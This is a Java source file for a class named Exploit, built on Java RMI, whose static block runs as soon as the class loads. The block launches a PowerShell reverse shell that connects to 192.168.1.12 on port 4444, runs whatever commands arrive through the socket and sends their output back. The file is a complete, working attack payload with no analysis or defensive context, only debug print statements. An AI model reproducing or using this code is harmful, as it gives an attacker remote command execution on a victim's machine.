import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Exploit extends UnicastRemoteObject implements ExploitInterface {
    public Exploit() throws RemoteException {
        super();
    }

    static {
        try {
            System.out.println("Exploit static block executed"); // 添加日志输出
            String[] cmd = {
                "cmd.exe", "/c", 
                "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.12',4444);" +
                "$stream = $client.GetStream();" +
                "[byte[]]$bytes = 0..65535|%{0};" +
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" +
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
                "$sendback = (iex $data 2>&1 | Out-String );" +
                "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
                "$stream.Write($sendbyte, 0, $sendbyte.Length);" +
                "$stream.Flush()" +
                "};" +
                "$client.Close()\""
            };
            new ProcessBuilder(cmd).start();
            System.out.println("Reverse shell command executed"); // 添加日志输出
        } catch (java.io.IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void execute() throws RemoteException {
        System.out.println("Exploit execute method called"); // 添加日志输出
    }
}
